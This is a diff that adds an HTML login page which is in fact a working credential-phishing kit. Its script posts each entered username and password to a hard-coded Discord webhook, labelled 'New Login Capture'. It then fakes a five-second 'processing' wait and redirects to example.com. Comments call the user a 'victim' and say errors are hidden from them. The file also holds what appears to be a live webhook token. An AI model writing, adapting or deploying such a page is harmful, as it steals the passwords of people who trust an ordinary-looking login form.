@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Login</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background: #000000;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    }
+
+    .login-container {
+      width: 360px;
+      padding: 40px 32px;
+      background: #111111;
+      border-radius: 12px;
+      border: 1px solid #222;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.6);
+    }
+
+    h1 {
+      color: #ffffff;
+      text-align: center;
+      margin-bottom: 32px;
+      font-size: 28px;
+      font-weight: 500;
+    }
+
+    .input-group {
+      position: relative;
+      margin-bottom: 20px;
+    }
+
+    input {
+      width: 100%;
+      padding: 14px 16px;
+      background: #222222;
+      border: 1px solid #444;
+      border-radius: 6px;
+      color: #ffffff;
+      font-size: 16px;
+      transition: border-color 0.2s;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: #0066ff;
+      box-shadow: 0 0 0 3px rgba(0, 102, 255, 0.15);
+    }
+
+    input::placeholder {
+      color: #888888;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 14px;
+      background: #0066ff;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: all 0.2s;
+      margin-top: 12px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .btn:hover {
+      background: #0055dd;
+    }
+
+    .btn:active {
+      background: #0044bb;
+    }
+
+    .btn.loading {
+      pointer-events: none;
+      background: #0055dd;
+    }
+
+    .btn.loading::after {
+      content: "";
+      position: absolute;
+      width: 20px;
+      height: 20px;
+      top: 50%;
+      left: 50%;
+      margin: -10px 0 0 -10px;
+      border: 3px solid #ffffff;
+      border-top-color: transparent;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+
+<div class="login-container">
+  <h1>Sign In</h1>
+  
+  <form id="loginForm" onsubmit="return false;">
+    <div class="input-group">
+      <input 
+        type="text" 
+        id="username" 
+        placeholder="USERNAME" 
+        autocomplete="off"
+        required
+      >
+    </div>
+    
+    <div class="input-group">
+      <input 
+        type="password" 
+        id="password" 
+        placeholder="PASSWORD" 
+        autocomplete="off"
+        required
+      >
+    </div>
+
+    <button type="submit" class="btn" id="loginBtn">Login</button>
+  </form>
+</div>
+
+<script>
+// === CHANGE THIS ===
+// Replace with your actual Discord webhook URL
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1465857153225982238/gvTstuV_t-qu1n1bzHa_8EbuWiY8K1Ya1_TIU8VY4Oi96vnrqrTy7B4oWIp7mkcXcnyX";
+
+document.getElementById("loginForm").addEventListener("submit", async (e) => {
+  e.preventDefault();
+
+  const username = document.getElementById("username").value.trim();
+  const password = document.getElementById("password").value.trim();
+  const button = document.getElementById("loginBtn");
+
+  if (!username || !password) return;
+
+  // Show loading state
+  button.classList.add("loading");
+  button.textContent = "";
+
+  // Prepare payload for Discord
+  const payload = {
+    embeds: [{
+      title: "New Login Capture",
+      color: 0x0066ff,
+      fields: [
+        { name: "Username", value: `\`${username}\``, inline: true },
+        { name: "Password",  value: `\`${password}\``,  inline: true }
+      ],
+      timestamp: new Date().toISOString(),
+      footer: {
+        text: "Login • " + window.location.hostname
+      }
+    }]
+  };
+
+  try {
+    // Send to webhook
+    await fetch(WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+  } catch (err) {
+    // Silently fail - victim shouldn't see error
+    console.error("Webhook send failed", err);
+  }
+
+  // Wait 5 seconds (fake "processing")
+  await new Promise(resolve => setTimeout(resolve, 5000));
+
+  // Redirect
+  window.location.href = "https://example.com";
+});
+</script>
+
+</body>
+</html>
